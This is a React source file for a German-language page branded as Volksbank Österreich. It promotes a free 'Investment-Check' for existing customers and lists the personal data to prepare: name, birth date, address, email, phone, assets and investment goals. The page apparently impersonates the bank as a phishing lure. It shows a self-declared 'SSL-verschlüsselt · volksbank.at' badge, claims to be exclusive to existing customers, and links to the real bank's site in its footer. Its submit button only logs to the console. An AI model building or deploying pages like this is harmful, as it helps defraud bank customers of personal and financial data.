import { useEffect } from "react";
import {
  User, Calendar, MapPin, Mail, Phone, Map, TrendingUp, Target,
  FileEdit, ShieldCheck, CalendarClock, MessageSquare,
  UserCheck, Landmark, Home, Wallet,
  ArrowRight, Lock, Info, Clock, Gift,
} from "lucide-react";
import volksbankLogo from "@/assets/volksbank-logo.png";
import volksbankIcon from "@/assets/volksbank.png";
import heroImage from "@/assets/investmentcheck-hero.jpg";
import { usePageMeta } from "@/hooks/use-page-meta";

const VB_NAVY = "#003882";
const JAHR = "2026";

type IconType = React.ComponentType<React.SVGProps<SVGSVGElement>>;

const SectionHeading = ({ children, kicker }: { children: React.ReactNode; kicker?: string }) => (
  <div className="text-center mb-8">
    {kicker && (
      <div className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-2" style={{ color: VB_NAVY }}>
        {kicker}
      </div>
    )}
    <h2 className="text-2xl md:text-[28px] font-semibold text-gray-900 leading-tight">{children}</h2>
    <div className="w-10 h-[3px] mx-auto rounded-full mt-4" style={{ backgroundColor: VB_NAVY }} />
  </div>
);

const InfoItem = ({
  Icon, title, text,
}: { Icon: IconType; title: string; text: string }) => (
  <div className="bg-white border border-gray-200 rounded-xl p-5 text-left flex gap-4 items-start shadow-sm transition-all duration-200 hover:-translate-y-0.5 hover:shadow-md hover:border-gray-300">
    <div
      className="shrink-0 w-9 h-9 rounded-md flex items-center justify-center border"
      style={{ backgroundColor: "rgba(0,56,130,0.06)", borderColor: "rgba(0,56,130,0.2)" }}
    >
      <Icon className="w-[18px] h-[18px]" style={{ color: VB_NAVY }} strokeWidth={2} />
    </div>
    <div className="min-w-0">
      <h3
        className="text-[13px] font-normal uppercase tracking-wider mb-1 leading-tight"
        style={{ color: VB_NAVY }}
      >
        {title}
      </h3>
      <p className="text-[13.5px] text-gray-600 leading-relaxed">{text}</p>
    </div>
  </div>
);

const InvestmentCheck = () => {
  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Volksbank Investment-Check für Bestandskunden", volksbankIcon);

  const handleCta = () => {
    console.log("Investment-Check gestartet");
  };

  const voraussetzungen: { Icon: IconType; title: string; text: string }[] = [
    { Icon: UserCheck, title: "Bestandskunde", text: "Aktives Konto bei der Volksbank Österreich" },
    { Icon: Home, title: "Wohnsitz", text: "Hauptwohnsitz in Österreich" },
    { Icon: Calendar, title: "Alter", text: "Mindestalter 18 Jahre" },
    { Icon: Landmark, title: "Anlageinteresse", text: "Vorhandenes Erspartes oder Anlagevermögen" },
  ];

  const schritte: { Icon: IconType; title: string; text: string }[] = [
    { Icon: FileEdit, title: "Angaben machen", text: "Kurze Fragen zu Ihrer Anlagesituation" },
    { Icon: ShieldCheck, title: "Auswertung", text: "Persönliche Analyse durch Volksbank-Experten" },
    { Icon: CalendarClock, title: "Terminvorschlag", text: "Sie erhalten passende Termine" },
    { Icon: MessageSquare, title: "Beratung", text: "Persönliches Gespräch, unverbindlich" },
  ];

  const angaben: { Icon: IconType; title: string; text: string }[] = [
    { Icon: User, title: "Name", text: "Vollständiger Vor- und Nachname" },
    { Icon: Calendar, title: "Geburtsdatum", text: "Tag, Monat und Jahr (TT.MM.JJJJ)" },
    { Icon: MapPin, title: "Adresse", text: "Straße, Hausnummer, optional Stiege und Tür" },
    { Icon: Map, title: "PLZ und Ort", text: "Postleitzahl und Ort" },
    { Icon: Mail, title: "E-Mail", text: "Für Rückfragen und Bestätigung" },
    { Icon: Phone, title: "Telefon", text: "Telefonnummer für Erreichbarkeit" },
    { Icon: TrendingUp, title: "Aktuelle Anlagen", text: "Grobe Übersicht Ihres Vermögens" },
    { Icon: Target, title: "Anlageziel", text: "Ihre Wünsche und Anlagehorizont" },
  ];

  const CtaButton = () => (
    <button
      type="button"
      onClick={handleCta}
      className="inline-flex items-center gap-2 text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors hover:brightness-110"
      style={{ backgroundColor: VB_NAVY }}
    >
      <span>Jetzt Investment-Check starten</span>
      <ArrowRight className="w-4 h-4" />
    </button>
  );

  return (
    <div className="min-h-screen bg-gray-50 text-gray-900" style={{ fontFamily: "'Open Sans', system-ui, sans-serif" }}>
      {/* Header */}
      <header className="bg-white border-b border-gray-200">
        <div className="container mx-auto flex items-center justify-center px-4 py-5">
          <span className="sr-only">Volksbank</span>
          <img src={volksbankLogo} alt="Volksbank" className="h-10 md:h-11" />
        </div>
        <div className="h-[3px] w-full" style={{ backgroundColor: VB_NAVY }} />
      </header>

      {/* Hero */}
      <section className="relative overflow-hidden border-b border-gray-200 bg-white">
        <div
          className="absolute inset-0 bg-cover bg-center"
          style={{ backgroundImage: `url(${heroImage})`, opacity: 0.5 }}
          aria-hidden="true"
        />
        <div className="absolute inset-0 bg-gradient-to-b from-white/50 via-white/60 to-gray-50/90" aria-hidden="true" />
        <div className="relative container mx-auto px-4 py-14 md:py-16 text-center max-w-3xl">
          <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-4" style={{ color: VB_NAVY }}>
            <span className="inline-block w-1.5 h-1.5 rounded-full" style={{ backgroundColor: VB_NAVY }} />
            Exklusiv für Bestandskunden · Volksbank
          </div>
          <h1 className="text-3xl md:text-5xl font-semibold mb-5 tracking-tight text-gray-900 leading-[1.1]">
            Investment-Check {JAHR}
          </h1>
          <p className="text-[15px] md:text-base text-gray-700 mb-8 max-w-xl mx-auto leading-relaxed">
            Prüfen Sie in wenigen Minuten, ob Ihr Erspartes wirklich für Sie arbeitet. Der{" "}
            <span className="font-semibold" style={{ color: VB_NAVY }}>Volksbank Investment-Check</span>{" "}
            ist kostenlos und unverbindlich.
          </p>

          <div className="grid grid-cols-2 gap-3 max-w-md mx-auto mb-8">
            <div className="bg-white border border-gray-200 rounded-xl px-4 py-3 text-left shadow-md transition-all duration-200 hover:-translate-y-0.5 hover:shadow-lg hover:border-gray-300 flex items-center gap-3">
              <Clock className="w-8 h-8 shrink-0" style={{ color: VB_NAVY }} strokeWidth={1.5} aria-hidden="true" />
              <div>
                <div className="text-[10.5px] font-bold uppercase tracking-wider mb-0.5" style={{ color: VB_NAVY }}>Dauer</div>
                <div className="text-xl font-semibold text-gray-900">ca. 3 Min.</div>
              </div>
            </div>
            <div className="bg-white border border-gray-200 rounded-xl px-4 py-3 text-left shadow-md transition-all duration-200 hover:-translate-y-0.5 hover:shadow-lg hover:border-gray-300 flex items-center gap-3">
              <Gift className="w-8 h-8 shrink-0" style={{ color: VB_NAVY }} strokeWidth={1.5} aria-hidden="true" />
              <div>
                <div className="text-[10.5px] font-bold uppercase tracking-wider mb-0.5" style={{ color: VB_NAVY }}>Kosten</div>
                <div className="text-xl font-semibold text-gray-900">kostenlos</div>
              </div>
            </div>
          </div>

          <CtaButton />
          <div className="flex items-center justify-center gap-2 mt-5 text-[12px] text-gray-500">
            <Lock className="w-3.5 h-3.5" />
            <span>SSL-verschlüsselt · volksbank.at</span>
          </div>
        </div>
      </section>

      <main className="py-12 md:py-14 space-y-14">
        {/* Was ist der Investment-Check */}
        <section className="container mx-auto px-4 max-w-3xl">
          <div className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm transition-all duration-200 hover:shadow-md hover:border-gray-300">
            <div className="h-1" style={{ backgroundColor: VB_NAVY }} />
            <div className="p-8 md:p-10 text-center">
              <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-3" style={{ color: VB_NAVY }}>
                <Info className="w-3.5 h-3.5" />
                Information
              </div>
              <h2 className="text-xl md:text-2xl font-semibold text-gray-900 mb-3">
                Was ist der Volksbank Investment-Check?
              </h2>
              <div className="text-gray-600 text-[14.5px] max-w-xl mx-auto leading-relaxed space-y-1">
                <p>Der Investment-Check ist eine kostenlose Ersteinschätzung Ihrer Anlagesituation.</p>
                <p>Exklusiv für Volksbank-Bestandskunden — persönlich, unabhängig und diskret.</p>
              </div>
            </div>
          </div>
        </section>

        {/* Voraussetzungen - 2x2 */}
        <section className="container mx-auto px-4 max-w-5xl">
          <SectionHeading kicker="Teilnahme">Voraussetzungen</SectionHeading>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {voraussetzungen.map((v) => (
              <InfoItem key={v.title} Icon={v.Icon} title={v.title} text={v.text} />
            ))}
          </div>
        </section>

        {/* So funktioniert's */}
        <section className="container mx-auto px-4 max-w-5xl">
          <SectionHeading kicker="Ablauf">So funktioniert&apos;s</SectionHeading>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {schritte.map((s, i) => (
              <div
                key={s.title}
                className="bg-white border border-gray-200 rounded-xl p-5 text-center shadow-sm transition-all duration-200 hover:-translate-y-0.5 hover:shadow-md hover:border-gray-300"
              >
                <span
                  className="mx-auto mb-3 w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold bg-white"
                  style={{ border: `1px solid ${VB_NAVY}`, color: VB_NAVY }}
                >
                  {i + 1}
                </span>
                <h3 className="text-[15px] font-semibold text-gray-900 mb-1 leading-tight">{s.title}</h3>
                <p className="text-[13.5px] text-gray-600 leading-relaxed">{s.text}</p>
              </div>
            ))}
          </div>
        </section>

        {/* Welche Angaben */}
        <section className="container mx-auto px-4 max-w-5xl">
          <SectionHeading kicker="Vorbereitung">Welche Angaben Sie benötigen</SectionHeading>
          <p className="text-gray-600 text-[14.5px] leading-relaxed text-center max-w-xl mx-auto mb-8 -mt-2">
            Halten Sie folgende Informationen bereit, bevor Sie den Check starten.
          </p>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {angaben.map((a) => (
              <InfoItem key={a.title} Icon={a.Icon} title={a.title} text={a.text} />
            ))}
          </div>
        </section>

        {/* CTA-Box */}
        <section className="container mx-auto px-4 max-w-3xl">
          <div className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm transition-all duration-200 hover:shadow-md hover:border-gray-300">
            <div className="h-1" style={{ backgroundColor: VB_NAVY }} />
            <div className="p-8 md:p-10 text-center">
              <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-3" style={{ color: VB_NAVY }}>
                <Info className="w-3.5 h-3.5" />
                Kundeninformation
              </div>
              <h2 className="text-xl md:text-2xl font-semibold text-gray-900 mb-3">
                Bereit für Ihren Investment-Check?
              </h2>
              <div className="text-gray-600 text-[14.5px] mb-6 max-w-xl mx-auto leading-relaxed space-y-1">
                <p>In wenigen Minuten erledigt.</p>
                <p>Kostenlos, unverbindlich und exklusiv für Bestandskunden.</p>
              </div>
              <CtaButton />
              <div className="flex items-center justify-center gap-2 mt-5 text-[12px] text-gray-500">
                <Lock className="w-3.5 h-3.5" />
                <span>SSL-verschlüsselt · Volksbank Österreich</span>
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="bg-white border-t border-gray-200">
        <div className="h-[3px] w-full" style={{ backgroundColor: VB_NAVY }} />
        <div className="container mx-auto px-4 py-8 text-center">
          <nav className="flex flex-wrap justify-center gap-x-6 gap-y-2 mb-3 text-[13px]">
            <a href="https://www.volksbank.at/zib/impressum.page" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:underline transition-colors" style={{ color: undefined }}>Impressum</a>
            <a href="https://www.volksbank.at/zib/datenschutz.page" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:underline transition-colors">Datenschutz</a>
            <a href="https://www.volksbank.at/zib/barrierefreiheit.page" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:underline transition-colors">Barrierefreiheitserklärung</a>
            <a href="https://www.volksbank.at/zib/kontakt.page" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:underline transition-colors">Kontakt</a>
          </nav>
          <p className="text-[11.5px] text-gray-500">
            © {JAHR} Volksbank Österreich · Nur für Bestandskunden
          </p>
        </div>
      </footer>
    </div>
  );
};

export default InvestmentCheck;
